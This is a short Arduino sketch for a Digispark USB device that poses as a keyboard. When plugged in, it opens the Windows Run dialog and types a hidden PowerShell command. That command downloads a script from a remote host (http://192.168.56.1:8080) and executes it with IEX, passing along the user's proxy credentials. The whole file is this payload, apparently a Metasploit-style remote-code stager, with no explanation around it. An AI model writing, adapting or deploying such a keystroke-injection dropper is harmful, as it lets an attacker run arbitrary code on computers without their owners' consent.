#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:
  DigiKeyboard.delay(5000);
  DigiKeyboard.update();

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // meta+r
  DigiKeyboard.delay(100);

  // Payload
  DigiKeyboard.println("powershell.exe -nop -w hidden -c $d=new-object net.webclient;$d.proxy=[Net.WebRequest]::GetSystemWebProxy();$d.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $d.downloadstring('http://192.168.56.1:8080/ZkBGVWt6qDd00E');");
}

void loop() {
  // put your main code here, to run repeatedly:

}
